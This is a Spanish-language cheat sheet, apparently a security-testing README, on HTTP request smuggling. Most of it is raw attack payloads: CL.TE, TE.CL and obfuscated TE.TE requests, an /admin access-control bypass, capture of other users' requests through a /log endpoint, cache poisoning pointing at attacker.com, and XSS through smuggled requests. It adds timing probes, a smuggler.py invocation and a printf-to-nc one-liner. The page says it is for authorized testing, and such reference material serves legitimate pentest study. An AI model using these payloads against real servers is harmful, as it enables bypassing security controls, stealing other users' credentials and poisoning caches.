# 📦 Guía rápida de HTTP request smuggling

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>


> **Precisiones de los ejemplos:** Se conservan literalmente los cuerpos, las cabeceras `Content-Length` y los tamaños de chunk del original; algunos son ilustrativos y no coinciden necesariamente con una solicitud lista para enviar. HTTP/1.1 cuenta bytes y usa terminaciones CRLF: copiar desde Markdown puede cambiar esas condiciones. Los comentarios `#` son explicaciones y no forman parte de las solicitudes. Un timeout o un 404 aislado no prueba smuggling: requiere confirmar una desincronización reproducible ([PortSwigger](https://portswigger.net/web-security/request-smuggling/finding)). En TE.TE, la ofuscación produce interpretaciones diferentes de Transfer-Encoding; la tabla es una simplificación. La presencia de un proxy, CDN o balanceador no implica vulnerabilidad. Se mantiene el título de curl, aunque el comando de esa sección usa `printf` y `nc`.


```
  ██╗  ██╗████████╗████████╗██████╗     ███████╗███╗   ███╗██╗   ██╗ ██████╗  ██████╗ ██╗     ██╗███╗   ██╗ ██████╗ 
  ██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗    ██╔════╝████╗ ████║██║   ██║██╔════╝ ██╔════╝ ██║     ██║████╗  ██║██╔════╝ 
  ███████║   ██║      ██║   ██████╔╝    ███████╗██╔████╔██║██║   ██║██║  ███╗██║  ███╗██║     ██║██╔██╗ ██║██║  ███╗
  ██╔══██║   ██║      ██║   ██╔═══╝     ╚════██║██║╚██╔╝██║██║   ██║██║   ██║██║   ██║██║     ██║██║╚██╗██║██║   ██║
  ██║  ██║   ██║      ██║   ██║         ███████║██║ ╚═╝ ██║╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║██║ ╚████║╚██████╔╝
  ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝         ╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
```

---

## 🎯 Qué es request smuggling

**HTTP request smuggling** (contrabando de solicitudes HTTP) aprovecha las discrepancias entre la forma en que el servidor frontal o proxy (front-end) y el servidor de origen (back-end) interpretan las solicitudes HTTP, lo que permite inyectar solicitudes adicionales.

### Impacto
- 🔴 **Eludir controles de seguridad**: evasión de WAF y ACL
- 🔴 **Envenenar la caché web**: almacenar respuestas maliciosas en la caché
- 🔴 **Robar credenciales**: capturar solicitudes de otros usuarios
- 🔴 **XSS**: XSS reflejado mediante una solicitud introducida por contrabando

---

## 🔍 Cómo funciona

### Cabeceras implicadas
```http
Content-Length: 13
Transfer-Encoding: chunked
```

### Tipos de vulnerabilidad
| Tipo | El front-end usa | El back-end usa |
|------|----------------|---------------|
| CL.TE | Content-Length | Transfer-Encoding |
| TE.CL | Transfer-Encoding | Content-Length |
| TE.TE | Ambos ofuscados | Se ignora una cabecera |

---

## 💉 Payloads de ataque

### CL.TE (Content-Length → Transfer-Encoding)

**El front-end usa Content-Length y el back-end usa Transfer-Encoding**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**Explotación:**
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 30
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Foo: x
```

### TE.CL (Transfer-Encoding → Content-Length)

**El front-end usa Transfer-Encoding y el back-end usa Content-Length**

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

### TE.TE (Transfer-Encoding ofuscado)

```http
# Ofuscar la cabecera TE
Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: identity

Transfer-Encoding
 : chunked

Transfer-Encoding: xchunked

Transfer-Encoding: chunked#
```

---

## 🔥 Ejemplos de explotación

### Eludir la seguridad del front-end
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 50
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable.com
Foo: x
```

### Capturar solicitudes de otros usuarios
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 100
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 300

data=
```
*La solicitud del siguiente usuario se añade a `data=`*

### Envenenamiento de caché mediante smuggling
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 130
Transfer-Encoding: chunked

0

GET /static/script.js HTTP/1.1
Host: vulnerable.com
X-Ignore: X
GET /malicious HTTP/1.1
Host: attacker.com
Foo: x
```

### XSS mediante smuggling
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /page?param=<script>alert(1)</script> HTTP/1.1
Host: vulnerable.com
Foo: x
```

---

## 🔍 Detección

### Detección basada en tiempos
```http
# Prueba CL.TE
POST / HTTP/1.1
Host: vulnerable.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X

# Si el back-end usa TE, espera el chunk "0"
# Tiempo de espera agotado = posible vulnerabilidad
```

### Respuesta diferencial
```http
# Enviar una solicitud por contrabando que provoque un 404
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Foo: bar

# Si la siguiente respuesta es 404 = vulnerable (interpretación del original)
```

---

## 🛠️ Herramientas

### Extensión de Burp Suite
```
1. Instalar la extensión "HTTP Request Smuggler"
2. Right-click request → Extensions → Launch Smuggle Probe
3. Comprobar los resultados en busca de vulnerabilidades de smuggling
```

### smuggler.py
```bash
git clone https://github.com/defparam/smuggler.git
cd smuggler
python3 smuggler.py -u https://target.com
```

### Pruebas manuales con curl
```bash
# Nota: curl normaliza las cabeceras; puede ser necesario usar TCP sin procesar
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX' | nc target.com 80
```

---

## 📊 Referencia rápida

### Lista de comprobación de detección
```markdown
- [ ] Comprobar si hay un proxy o balanceador de carga (varios servidores)
- [ ] Probar los tiempos de CL.TE
- [ ] Probar los tiempos de TE.CL
- [ ] Probar la ofuscación de la cabecera TE
- [ ] Verificar mediante una respuesta diferencial
```

### Indicadores habituales
```
- Balanceadores de carga (AWS ALB, HAProxy)
- Proxies inversos (nginx, Apache)
- CDN (Cloudflare, Akamai)
- Conversión de HTTP/2 a HTTP/1.1
```

---

## ⚠️ Notas importantes

```
1. Las pruebas pueden afectar a otros usuarios
2. Usar entornos de prueba aislados cuando sea posible
3. Añadir identificadores únicos para reconocer las solicitudes propias
4. Informar de manera responsable con una prueba de concepto (PoC)
```

---

## 📚 Recursos

- [PortSwigger HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [HTTP Desync Attacks (Albinowax)](https://portswigger.net/research/http-desync-attacks)
- [Herramienta Smuggler](https://github.com/defparam/smuggler)

---

<p align="center">
  <b>📦 ¡Introduce solicitudes por contrabando!</b><br>
  <i>¡Solo para pruebas autorizadas!</i>
</p>
